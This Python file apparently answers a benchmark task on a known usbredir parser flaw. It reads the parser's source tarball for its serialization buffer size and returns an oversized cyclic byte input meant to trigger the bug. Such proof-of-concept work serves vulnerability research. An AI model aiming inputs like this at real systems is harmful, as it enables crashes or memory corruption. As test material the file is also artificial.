import os
import re
import tarfile


class Solution:
    def solve(self, src_path: str) -> bytes:
        # Default buffer size per vulnerability description
        base_size = 65536

        # Try to detect USBREDIRPARSER_SERIALIZE_BUF_SIZE from source
        try:
            if src_path and os.path.exists(src_path):
                with tarfile.open(src_path, "r:*") as tf:
                    for m in tf.getmembers():
                        if not m.isfile():
                            continue
                        name = m.name.lower()
                        if not (name.endswith(".h") or name.endswith(".c") or name.endswith(".cc") or name.endswith(".cpp")):
                            continue
                        f = tf.extractfile(m)
                        if not f:
                            continue
                        try:
                            s = f.read().decode("utf-8", errors="ignore")
                        except Exception:
                            continue

                        # Look for macro define
                        m1 = re.search(r"#\s*define\s+USBREDIRPARSER_SERIALIZE_BUF_SIZE\s+([^\s/]+)", s)
                        if m1:
                            expr = m1.group(1)
                            # Allow simple integer or simple arithmetic expressions like 64*1024 or (1<<16)
                            if re.fullmatch(r"[0-9xXa-fA-F\s\(\)\+\-\*<>&|]+", expr):
                                try:
                                    val = eval(expr, {"__builtins__": {}}, {})
                                    if isinstance(val, int) and val > 0:
                                        base_size = val
                                        break
                                except Exception:
                                    pass
                            # Fallback: if it's a plain decimal number
                            m2 = re.fullmatch(r"\d+", expr)
                            if m2:
                                try:
                                    val = int(expr)
                                    if val > 0:
                                        base_size = val
                                        break
                                except Exception:
                                    pass
        except Exception:
            pass

        # Ensure sane base size
        if not isinstance(base_size, int) or base_size < 1024:
            base_size = 65536

        # Target payload length: exceed serialize buffer comfortably
        # Add 16KB on top to reliably trigger reallocation without being excessively large
        target_len = base_size + 16384

        # Build robust byte pattern (cyclic 0..255) to avoid pathological control values
        pattern = bytes(range(256))
        repeats = (target_len // len(pattern)) + 1
        data = (pattern * repeats)[:target_len]

        return data